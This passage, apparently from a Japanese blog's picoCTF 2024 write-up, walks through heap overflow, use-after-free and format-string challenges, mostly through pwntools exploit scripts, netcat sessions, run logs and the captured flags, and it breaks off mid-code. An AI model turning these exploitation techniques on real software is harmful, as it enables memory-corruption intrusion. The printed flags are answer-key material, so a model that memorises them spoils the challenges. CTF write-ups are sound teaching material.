Flag:          (Try to print the flag, good luck)</span><br><span class="line"><span class="number">5.</span> Exit</span><br><span class="line"></span><br><span class="line">Enter your choice: <span class="number">1</span></span><br><span class="line">Heap State:</span><br><span class="line">+-------------+----------------+</span><br><span class="line">[*] Address   -&gt;   Heap Data</span><br><span class="line">+-------------+----------------+</span><br><span class="line">[*]   <span class="number">0x55b03af632b0</span>  -&gt;   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">+-------------+----------------+</span><br><span class="line">[*]   <span class="number">0x55b03af632d0</span>  -&gt;   A</span><br><span class="line">+-------------+----------------+</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> Print Heap:          (print the current state of the heap)</span><br><span class="line"><span class="number">2.</span> Write to buffer:     (write to your own personal block of data on the heap)</span><br><span class="line"><span class="number">3.</span> Print safe_var:      (I<span class="number">&#x27;ll</span> even let you look at my variable on the heap, I<span class="number">&#x27;</span>m confident it can<span class="number">&#x27;</span>t be modified)</span><br><span class="line"><span class="number">4.</span> Print Flag:          (Try to print the flag, good luck)</span><br><span class="line"><span class="number">5.</span> Exit</span><br><span class="line"></span><br><span class="line">Enter your choice: <span class="number">4</span></span><br><span class="line"></span><br><span class="line">YOU WIN</span><br><span class="line">picoCTF&#123;my_first_heap_overflow_0c473fe8&#125;</span><br></pre></td></tr></table></figure>

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{my_first_heap_overflow_0c473fe8}

</aside>

<h3><span id="heap-1">heap 1</span></h3><img src="/img/2024/03-27/Untitled%2051.png" width="550px" height="auto"> 

<p>heap 0 と考え方は一緒。今回はオーバーフローして後続領域を壊すのではなく、後続領域を “pico” と書き換える。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">% nc tethys.picoctf.net 57621</span><br><span class="line"></span><br><span class="line">Welcome to heap1!</span><br><span class="line">I put my data on the heap so it should be safe from any tampering.</span><br><span class="line">Since my data isn<span class="string">&#x27;t on the stack I&#x27;</span>ll even <span class="built_in">let</span> you write whatever info you want to the heap, I already took care of using malloc <span class="keyword">for</span> you.</span><br><span class="line"></span><br><span class="line">Heap State:</span><br><span class="line">+-------------+----------------+</span><br><span class="line">[*] Address   -&gt;   Heap Data</span><br><span class="line">+-------------+----------------+</span><br><span class="line">[*]   0x55c6dc58c2b0  -&gt;   pico</span><br><span class="line">+-------------+----------------+</span><br><span class="line">[*]   0x55c6dc58c2d0  -&gt;   bico</span><br><span class="line">+-------------+----------------+</span><br><span class="line"></span><br><span class="line">1. Print Heap:          (<span class="built_in">print</span> the current state of the heap)</span><br><span class="line">2. Write to buffer:     (write to your own personal block of data on the heap)</span><br><span class="line">3. Print safe_var:      (I<span class="string">&#x27;ll even let you look at my variable on the heap, I&#x27;</span>m confident it can<span class="string">&#x27;t be modified)</span></span><br><span class="line"><span class="string">4. Print Flag:          (Try to print the flag, good luck)</span></span><br><span class="line"><span class="string">5. Exit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Enter your choice: 2</span></span><br><span class="line"><span class="string">Data for buffer: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApico</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1. Print Heap:          (print the current state of the heap)</span></span><br><span class="line"><span class="string">2. Write to buffer:     (write to your own personal block of data on the heap)</span></span><br><span class="line"><span class="string">3. Print safe_var:      (I&#x27;</span>ll even <span class="built_in">let</span> you look at my variable on the heap, I<span class="string">&#x27;m confident it can&#x27;</span>t be modified)</span><br><span class="line">4. Print Flag:          (Try to <span class="built_in">print</span> the flag, good luck)</span><br><span class="line">5. Exit</span><br><span class="line"></span><br><span class="line">Enter your choice: 3</span><br><span class="line"></span><br><span class="line">Take a look at my variable: safe_var = pico</span><br><span class="line"></span><br><span class="line">1. Print Heap:          (<span class="built_in">print</span> the current state of the heap)</span><br><span class="line">2. Write to buffer:     (write to your own personal block of data on the heap)</span><br><span class="line">3. Print safe_var:      (I<span class="string">&#x27;ll even let you look at my variable on the heap, I&#x27;</span>m confident it can<span class="string">&#x27;t be modified)</span></span><br><span class="line"><span class="string">4. Print Flag:          (Try to print the flag, good luck)</span></span><br><span class="line"><span class="string">5. Exit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Enter your choice: 4</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">YOU WIN</span></span><br><span class="line"><span class="string">picoCTF&#123;starting_to_get_the_hang_c588b8a1&#125;</span></span><br></pre></td></tr></table></figure>

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{starting_to_get_the_hang_c588b8a1}

</aside>

<h3><span id="heap-2">heap 2</span></h3><img src="/img/2024/03-27/Untitled%2052.png" width="550px" height="auto"> 

<p><code>x</code> を win() のアドレスで書き換えれば勝ち。</p>
<p>No PIEなのでwin()のアドレスはgdbなどで静的に取れる → 0x4011a0</p>
<p>以下のコードでOK。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## Run local executable.</span></span><br><span class="line"><span class="comment">##   ./exploit.py LOCAL EXE=./executable</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">## Run remote (with local executable for addresses)</span></span><br><span class="line"><span class="comment">##   ./exploit.py HOST=example.com PORT=4141 EXE=/tmp/executable</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">## Run with GDB script.</span></span><br><span class="line"><span class="comment">##   ./exploit.py GDB</span></span><br><span class="line"><span class="comment">## --- (Edit GDB script if necessary) --------------------------------</span></span><br><span class="line">gdbscript = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">b check_win</span></span><br><span class="line"><span class="string">p win</span></span><br><span class="line"><span class="string">b print_menu</span></span><br><span class="line"><span class="string">c</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">    **<span class="built_in">locals</span>()</span><br><span class="line">)</span><br><span class="line"><span class="comment">## -------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">## --- (do not edit) ---------------------------------------------------</span></span><br><span class="line">exe = context.binary = ELF(args.EXE)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start_local</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="keyword">if</span> args.GDB:</span><br><span class="line">        <span class="keyword">return</span> gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> process([exe.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start_remote</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    host = args.HOST</span><br><span class="line">    port = <span class="built_in">int</span>(args.PORT)</span><br><span class="line">    io = connect(host, port)</span><br><span class="line">    <span class="keyword">if</span> args.GDB:</span><br><span class="line">        gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="keyword">if</span> args.LOCAL:</span><br><span class="line">        <span class="keyword">return</span> start_local(argv, *a, **kw)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> start_remote(argv, *a, **kw)</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"><span class="comment">## -----------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## EXPLOIT GOES HERE</span></span><br><span class="line"></span><br><span class="line">win_addr = p32(<span class="number">0x4011A0</span>)</span><br><span class="line"><span class="comment">## win_addr = b&#x27;B&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## write buffer</span></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;Enter your choice: &quot;</span>, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;Data for buffer: &quot;</span>, <span class="string">b&quot;A&quot;</span> * <span class="number">32</span> + win_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">## print x</span></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;Enter your choice: &quot;</span>, <span class="string">b&quot;3&quot;</span>)</span><br><span class="line">io.recvline()</span><br><span class="line">io.recvline()</span><br><span class="line"><span class="built_in">print</span>(io.recvline())</span><br><span class="line"></span><br><span class="line"><span class="comment">## print flag</span></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;Enter your choice: &quot;</span>, <span class="string">b&quot;4&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(io.recvline())</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line">io.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>実行する。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">% python exploit.py EXE=./chall HOST=mimas.picoctf.net PORT=57777</span><br><span class="line">[*] <span class="string">&#x27;/home/laysakura/share/picoCTF2024/pwn/435-heap-2/chall&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">[+] Opening connection to mimas.picoctf.net on port 57777: Done</span><br><span class="line">b<span class="string">&#x27;x = \xa0\x11@\n&#x27;</span></span><br><span class="line">b<span class="string">&#x27;picoCTF&#123;and_down_the_road_we_go_dbb7ff66&#125;\n&#x27;</span></span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$</span><br></pre></td></tr></table></figure>

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{and_down_the_road_we_go_dbb7ff66}

</aside>

<h3><span id="heap-3">heap 3</span></h3><img src="/img/2024/03-27/Untitled%2053.png" width="550px" height="auto"> 

<p>Use-after-free が使える。以下の戦略。</p>
<ol>
<li>Free x を呼び出し、xの指すアドレスをfreelistに載せる。</li>
<li>Allocate objectでmalloc。上記元 x のアドレスが確保される。その領域の30~35バイト目に  <code>&quot;pico\0&quot;</code> の文字列をセット。</li>
<li>Check for win で <code>x-&gt;flag</code> を参照。上記の <code>&quot;pico\0&quot;</code> が参照されて勝ち。</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## Run local executable.</span></span><br><span class="line"><span class="comment">##   ./exploit.py LOCAL EXE=./executable</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">## Run remote (with local executable for addresses)</span></span><br><span class="line"><span class="comment">##   ./exploit.py HOST=example.com PORT=4141 EXE=/tmp/executable</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">## Run with GDB script.</span></span><br><span class="line"><span class="comment">##   ./exploit.py GDB</span></span><br><span class="line"><span class="comment">## --- (Edit GDB script if necessary) --------------------------------</span></span><br><span class="line">gdbscript = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">b check_win</span></span><br><span class="line"><span class="string">p win</span></span><br><span class="line"><span class="string">b print_menu</span></span><br><span class="line"><span class="string">c</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">    **<span class="built_in">locals</span>()</span><br><span class="line">)</span><br><span class="line"><span class="comment">## -------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">## --- (do not edit) ---------------------------------------------------</span></span><br><span class="line">exe = context.binary = ELF(args.EXE)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start_local</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="keyword">if</span> args.GDB:</span><br><span class="line">        <span class="keyword">return</span> gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> process([exe.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start_remote</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    host = args.HOST</span><br><span class="line">    port = <span class="built_in">int</span>(args.PORT)</span><br><span class="line">    io = connect(host, port)</span><br><span class="line">    <span class="keyword">if</span> args.GDB:</span><br><span class="line">        gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="keyword">if</span> args.LOCAL:</span><br><span class="line">        <span class="keyword">return</span> start_local(argv, *a, **kw)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> start_remote(argv, *a, **kw)</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"><span class="comment">## -----------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## EXPLOIT GOES HERE</span></span><br><span class="line"></span><br><span class="line">win_addr = p32(<span class="number">0x4011A0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## Free x</span></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;Enter your choice: &quot;</span>, <span class="string">b&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## Allocate object</span></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;Enter your choice: &quot;</span>, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;Size of object allocation: &quot;</span>, <span class="string">b&quot;35&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;Data for flag: &quot;</span>, <span class="string">b&quot;pico\0&quot;</span> * <span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## Check for win</span></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;Enter your choice: &quot;</span>, <span class="string">b&quot;4&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(io.recvline())</span><br><span class="line"><span class="built_in">print</span>(io.recvline())</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure>

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{now_thats_free_real_estate_a11cf359}

</aside>

<h3><span id="format-string-1">format string 1</span></h3><img src="/img/2024/03-27/Untitled%2054.png" width="550px" height="auto"> 

<p>普通の書式文字列攻撃でスタック上のフラグをリーク。なんでこんなにLiked低いんだろう？</p>
<p>解き方は↓に解説してあるものそのまま使える。</p>
<p><a target="_blank" rel="noopener" href="https://laysakura.notion.site/CTF-pwn-reverse-e0fd38c4a24040679c0e45eed3c8d7ab#bf9ae57474be42a1b0628b2193b7d2b2">テンプレ: 書式文字列攻撃 (Format String Attack) でスタック上の文字列を復元</a></p>
<p>スクリプト↓</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## Run local executable.</span></span><br><span class="line"><span class="comment">##   ./exploit.py LOCAL EXE=./executable</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">## Run remote (with local executable for addresses)</span></span><br><span class="line"><span class="comment">##   ./exploit.py HOST=example.com PORT=4141 EXE=/tmp/executable</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">## Run with GDB script.</span></span><br><span class="line"><span class="comment">##   ./exploit.py GDB</span></span><br><span class="line"><span class="comment">## --- (Edit GDB script if necessary) --------------------------------</span></span><br><span class="line">gdbscript = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">tbreak main</span></span><br><span class="line"><span class="string">continue</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">    **<span class="built_in">locals</span>()</span><br><span class="line">)</span><br><span class="line"><span class="comment">## -------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">## --- (do not edit) ---------------------------------------------------</span></span><br><span class="line"><span class="keyword">if</span> args.EXE:</span><br><span class="line">    exe = context.binary = ELF(args.EXE)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start_local</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="keyword">if</span> args.GDB:</span><br><span class="line">        <span class="keyword">return</span> gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> process([exe.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start_remote</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    host = args.HOST</span><br><span class="line">    port = <span class="built_in">int</span>(args.PORT)</span><br><span class="line">    io = connect(host, port)</span><br><span class="line">    <span class="keyword">if</span> args.GDB:</span><br><span class="line">        gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="keyword">if</span> args.LOCAL:</span><br><span class="line">        <span class="keyword">return</span> start_local(argv, *a, **kw)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> start_remote(argv, *a, **kw)</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"><span class="comment">## -----------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## EXPLOIT GOES HERE</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 書式文字列攻撃 (スタックのリーク)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## param: printfの何番目の引数（=~ スタックポインタの何個上のワード）から、</span></span><br><span class="line">offset = <span class="number">0</span></span><br><span class="line"><span class="comment">## param: 何番目の引数までのアドレスを出力するか</span></span><br><span class="line">num = <span class="number">300</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;,&quot;</span>.join([<span class="string">f&quot;%<span class="subst">&#123;i&#125;</span>$p&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(offset, offset + num)])</span><br><span class="line"></span><br><span class="line"><span class="comment">## param: バナー</span></span><br><span class="line">io.sendlineafter(</span><br><span class="line">    <span class="string">b&quot;Give me your order and I&#x27;ll read it back to you:\n&quot;</span>,</span><br><span class="line">    payload,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">retstr = io.recvline().decode().split(<span class="string">&quot;Here&#x27;s your order:&quot;</span>)[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">## 出力されたアドレスをASCIIに変換して表示</span></span><br><span class="line">addresses = retstr.split(<span class="string">&quot;,&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> address <span class="keyword">in</span> addresses:</span><br><span class="line">    <span class="keyword">if</span> address.startswith(<span class="string">&quot;0x&quot;</span>):</span><br><span class="line">        decoded = unhex(address.strip()[<span class="number">2</span>:])</span><br><span class="line">        reversed_hex = decoded[::-<span class="number">1</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(reversed_hex))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line">io.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>これを↓で実行する。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">% python exploit.py HOST=mimas.picoctf.net PORT=<span class="number">64526</span> EXE=./<span class="built_in">format</span>-string-<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>出力に</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;picoCTF&#123;&#x27;</span></span><br><span class="line"><span class="string">b&#x27;4n1m41_5&#x27;</span></span><br><span class="line"><span class="string">b&#x27;7y13_4x4&#x27;</span></span><br><span class="line"><span class="string">b&#x27;_f14g_b5&#x27;</span></span><br><span class="line"><span class="string">b&#x27;d7b98f&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>の箇所がある。</p>
<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{4n1m41_57y13_4x4_f14g_b5d7b98f}

</aside>

<h3><span id="format-string-2">format string 2</span></h3><img src="/img/2024/03-27/Untitled%2055.png" width="550px" height="auto"> 

<p>問題のコードは↓。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> sus = <span class="number">0x21737573</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">1024</span>];</span><br><span class="line">  <span class="type">char</span> flag[<span class="number">64</span>];</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;You don&#x27;t have what it takes. Only a true wizard could change my suspicions. What do you have to say?\n&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%1024s&quot;</span>, buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Here&#x27;s your input: &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (sus == <span class="number">0x67616c66</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;I have NO clue how you did that, you must be a wizard. Here you go...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in the flag</span></span><br><span class="line">    FILE *fd = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    fgets(flag, <span class="number">64</span>, fd);</span><br><span class="line"></span><br><span class="line">    <span 